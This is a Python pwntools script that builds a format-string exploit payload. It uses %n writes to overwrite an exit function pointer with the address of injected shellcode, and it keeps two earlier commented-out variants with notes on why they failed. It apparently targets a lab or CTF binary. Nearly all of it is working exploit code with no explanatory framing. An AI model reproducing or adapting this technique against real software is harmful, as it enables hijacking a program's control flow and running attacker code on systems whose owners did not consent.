#!/usr/bin/python3
from pwn import *
import sys


address_of_exit = 0x804c008
# address_of_exit = 0x804c050
address_of_shellcode = 0xffffdf9c

payload = p32(address_of_exit) + p32(address_of_exit+3) + b'E'
# payload = b'AAAA' + b'BBBB' + b'E'
location = 121

printed_chars = len(payload)

# very special
shift = 0
bytes_to_insert = (address_of_shellcode >> shift) & 0xffffff
res = bytes_to_insert - printed_chars
if res <= 4:
    while res <= 4:
        res += 0x1000000
payload += b'%' + f"{res:010}".encode() + b'p'
payload += f'%{location}$n'.encode()
location += 1

printed_chars += res
    
# regular
shift = 24
byte_to_insert = (address_of_shellcode >> shift) & 0xff
res = byte_to_insert - printed_chars
if res <= 4:
    while res <= 4:
        res += 0x100
payload += b'%' + f"{res:03}".encode() + b'p'
payload += f'%{location}$n'.encode()
location += 1


sys.stdout.buffer.write(payload)



# for semi regular address it will work, however, we'll need to go on the address 0x804c00a, which gives us '\x0a', newline that screws everything up. yay :(
'''
address_of_exit = 0x804c008
# address_of_exit = 0x804c050
address_of_shellcode = 0xffffdf9c

payload = p32(address_of_exit) + p32(address_of_exit+1) + p32(address_of_exit+4)
# payload = b'AAAA' + b'BBBB' + b'DDDD' + b'EEE'
location = 122

printed_chars = len(payload)

# regular
shift = 0
byte_to_insert = (address_of_shellcode >> shift) & 0xff
res = byte_to_insert - printed_chars
if res <= 4:
    while res <= 4:
        res += 0x100
payload += b'%' + f"{res:03}".encode() + b'p'
payload += f'%{location}$p'.encode()
location += 1

# special
shift = 8
bytes_to_insert = (address_of_shellcode >> shift) & 0xffff
res = bytes_to_insert - printed_chars
if res <= 4:
    while res <= 4:
        res += 0x10000
payload += b'%' + f"{res:05}".encode() + b'p'
payload += f'%{location}$p'.encode()
location += 1

# regular
shift = 24
byte_to_insert = (address_of_shellcode >> shift) & 0xff
res = byte_to_insert - printed_chars
if res <= 4:
    while res <= 4:
        res += 0x100
payload += b'%' + f"{res:03}".encode() + b'p'
payload += f'%{location}$p'.encode()
location += 1

printed_chars += res
    

sys.stdout.buffer.write(payload)
'''




# for regular address it will work, however, we'll need to go on the address 0x804c00a, which gives us '\x0a', newline that screws everything up. yay :(
'''

# address_of_exit = 0x804c008
address_of_exit = 0x804c050
address_of_shellcode = 0xffffdf9c

payload = p32(address_of_exit) + p32(address_of_exit+1) + p32(address_of_exit+2) + p32(address_of_exit+3) + b'EE'
# payload = b'AAAA' + b'BBBB' + b'CCCC' + b'DDDD' + b'EE'
location = 123

printed_chars = len(payload)
for shift in range(0, 32, 8):
    byte_to_insert = (address_of_shellcode >> shift) & 0xff
    res = byte_to_insert - printed_chars
    if res <= 4:
        while res <= 4:
            res += 0x100
    payload += b'%' + f"{res:03}".encode() + b'p'
    payload += f'%{location}$n'.encode()
    location += 1

    printed_chars += res
    

sys.stdout.buffer.write(payload)
'''
